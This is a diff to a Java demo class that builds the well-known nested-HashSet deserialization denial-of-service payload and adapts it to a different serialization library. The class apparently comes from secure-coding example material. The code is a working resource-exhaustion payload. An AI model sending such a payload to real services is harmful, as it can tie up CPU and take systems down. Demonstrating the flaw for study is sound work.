@@ -22,23 +22,25 @@
 
 package ser06j;
 
-import ser09j.Bicycle;
 import java.io.IOException;
 import java.util.HashSet;
 import java.util.Set;
+
+import one.microstream.persistence.binary.types.Binary;
+import ser09j.Bicycle;
 import serial.Serial;
 
 // java serialization DoS
 public class SerialDOS {
 
   // Deserializing the HashSet will recurse indefinitely, consuming CPU
-  static byte[] DoSpayload() throws IOException {
-    Set<Object> root = new HashSet<>();
+  static Binary DoSpayload() throws IOException {
+    final Set<Object> root = new HashSet<>();
     Set<Object> s1 = root;
     Set<Object> s2 = new HashSet<>();
     for (int i = 0; i < 100; i++) {
-      Set<Object> t1 = new HashSet<>();
-      Set<Object> t2 = new HashSet<>();
+      final Set<Object> t1 = new HashSet<>();
+      final Set<Object> t2 = new HashSet<>();
       t1.add("foo"); // make it not equal to t2
       s1.add(t1);
       s1.add(t2);
@@ -50,11 +52,11 @@ public class SerialDOS {
     return Serial.serialize(root);
   }
 
-  public static void main(String[] args) throws InterruptedException {
+  public static void main(final String[] args) throws InterruptedException {
     // start a thread to deserialize the DoS payload
     new Thread(() -> {
       try {
-        Bicycle myBike = (Bicycle) Serial.deserialize(DoSpayload());
+        final Bicycle myBike = (Bicycle) Serial.deserialize(DoSpayload());
         System.out.println(myBike.getName() + " has been deserialized.");
       } catch (ClassNotFoundException | IOException e) {
         e.printStackTrace();
